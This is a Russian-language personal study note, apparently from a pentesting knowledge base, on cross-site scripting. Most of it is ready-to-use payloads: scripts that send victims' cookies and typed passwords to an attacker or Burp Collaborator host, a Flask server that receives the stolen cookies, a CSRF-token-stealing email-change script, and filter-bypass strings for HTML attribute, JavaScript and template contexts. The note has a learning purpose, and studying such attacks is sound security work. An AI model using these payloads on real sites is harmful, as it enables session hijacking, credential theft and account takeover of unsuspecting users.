***
[PayloadsAllTheThings/XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#cross-site-scripting)
***
# Навигация

> [[XSS#Exploiting cross-site scripting to steal cookies|1. Exploiting cross-site scripting to steal cookies]]
> [[XSS#XSS в HTML атрибутах|2. XSS в HTML атрибутах]]
> [[XSS### XSS into JavaScript|3. ## XSS into JavaScript]]
***
# Exploiting cross-site scripting to steal cookies

[PayloadsAllTheThings - XSS - data-grabber-for-xs](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss)
Пример в CORS: 
```
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```
или
```
<img src=x onerror=this.src="http://<my_server>:<port>/"+btoa(document.cookie)>
```
### Python web-server to take cookie:
```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST'])
def handle_post():
	message = request.data.decode('utf-8')
	print("Received message:", message)
	return 'Message recieved'
if __name__ == '__main__':
	app.run(port=8080)
```
#### Atack payload
```javascript
<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: 'message=Hello', headers: { 'Content-Type': 'text/plain' }}); ">
```
```javascript
<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: document.cookie, headers: { 'Content-Type': 'text/plain' }}); ">
```
### Exploiting cross-site scripting to capture passwords
Здесь представлена форма, которая ожидает ввода логина и пароля, и сказу отправляет из в коллаборатор.
```javascript
<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method:'POST', mode:'no-cors', body:username.value+':'+this.value });">
```
### Exploiting XSS to perform CSRF
**Пользователь**, зашедший на страницу с **xss**, направит запрос и свой **csrf токен** на смену **email** на **'/my-account/change-email'**, если **токен** висит в **html**.
```javascript
<script>  
var req = new XMLHttpRequest();  
req.onload = handleResponse;  
req.open('get','/my-account',true);  
req.send();  
function handleResponse() {  
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  
var changeReq = new XMLHttpRequest();  
changeReq.open('post', '/my-account/change-email', true);  
changeReq.send('csrf='+token+'&email=test@test.com')  
};  
</script>
```

# XSS в HTML атрибутах

[portswigger.net/XSS/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
1. Через intruder проверить не заблокированные теги и атрибуты.
2. Если ввод попадает в href, можно использовать следующую конструкцию `javascript:alert(1)`. Выйдет следующее: 
`<a href="javascript:alert(document.domain)">`
3. Проверь атрибут `accesskey`. Пример: 
`https://web-site/?%27accesskey=%27x%27onclick=%27alert(1)`; где `%27` = `'`. 
Скрипт сработает при нажатии:
- On Windows: `ALT+SHIFT+X` / `ALT+X`
- On MacOS: `CTRL+ALT+X`
- On Linux: `Alt+X`
# XSS into JavaScript
Если ввод попадает в скрипт внутри HTML:
1. Попытаться закрыть тег предыдущего скрипта и открыть новый: `</script><img src=1 onerror=alert(document.domain)>`
2. Если ввод находится в литералах : \` \`, ' ', " ", стоит попытаться выйти из них:
	```javascript
	'-alert(document.domain)-'
	';alert(document.domain)//
	```
	
	2.1. Если литералы экранируются, стоит проверить экранацию косой черты: \\ : ``\';alert(document.domain)//``
	2.2. Если косая черта экранируется, можно закодировать литерал, скорее всего в HTML кодировку: 
	`&apos;-alert(document.domain)-&apos;`
	2.3. Использовать конструкцию \${}: `${alert(document.domain)}`
1. Если запрещены круглые скобки, можно передавать аргументы в функции через конструкцию: `onerror=alert;throw 1`

# CSTI - Client side template injection
[XSS in Angular.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)
**CSTI** - тип уязвимости, возникающий, когда разработчик позволяет пользовательскому вводу определять выражения шаблонов на веб-странице, что позволяет злоумышленнику внедрять вредоносные выражения шаблонов (которые являются упрощённым JavaScript) для эксплуатации веб-приложения. Это происходит в браузере и HTML, аналогично тому, как работает межсайтовый скриптинг (XSS). Некоторые JS фреймворки, такие как AngularJS, имеют песочницу, которая предотвращает использование определённых объектов, к которым разработчик не имел права доступа. Чтобы злоумышленник мог эксплуатировать это, ему нужно найти способ "выбраться" из песочницы, что означает получение доступа к областям, таким как объект документа, чтобы проэксплуатировать веб-приложение.

# CSP директивы 
[CSP Evaluator (csp-evaluator.withgoogle.com)](https://csp-evaluator.withgoogle.com/) - сервис для проверки на безопасность веб-страницы по её CSP тегам. 
![[CSP директивы.png]]

# Self-XSS
**Self-XSS** - это форма атаки, при которой жертва атаки ненамеренно запускает вредоносный код в своём собственном браузере, что приводит к раскрытию личной информации атакующему. Это достигается путём **обмана пользователей в копировании и вставке вредоносного контента в консоль веб-разработчика** их браузера. В обычных условиях атакующий публикует сообщение, утверждая, что копирование и выполнение определённого кода позволит пользователю получить виртуальные награды или взломанный сайт. На самом деле код позволяет атакующему захватить учётную запись жертвы. 

# PDF-XSS
Если браузер использует PDF, можно исполнить JS следующим образом:
```url
https://sute/file.pdf#any=javascript:alert(1)
```
# Mutation XSS
**Mutation XSS (mxss)** - тип атаки на веб-приложение, который происходит, когда ненадёжные данные обрабатываются в контексте свойства DOM 'innerHTML' и изменяются браузером. Этот  тип атаки особенно опасен, поскольку он может обойти большинство существующих фильтров и санитайзеров XSS, позволяя вредоносному коду выполняться в браузере пользователя. Примером может служить ситуация, когда сервер корректно экранирует входные данные, но не предотвращает их декодирование браузером в вредоносный скрипт из-за сложного поведения браузера, который переинтерпретирует контент. 
Другими словами браузер может самостоятельно не только декодировать символы, но и дописывать HTML теги. Т.е если подать на вход:
```javascript
<template><p title="</template><img src=x onerror=alert(1)>">
```
То браузер может переписать это в:
```javascript
<template>
	<p title="</template><img src=x onerror=alert(1)>"></p>
</template>
```
# Bliend XSS
**Bliend XSS** - тип уязвимости, при котором вредоносный код внедряется в веб-приложение и сохраняется на сервере, но его выполнение происходит в другом месте, недоступном для атакующего. 
Можно поднять у себя следующую службу: [XSS Hanter Express](https://github.com/mandatoryprogrammer/xsshunter-express), они служит отличный инструментом для эксплуатации **bliend XSS**.
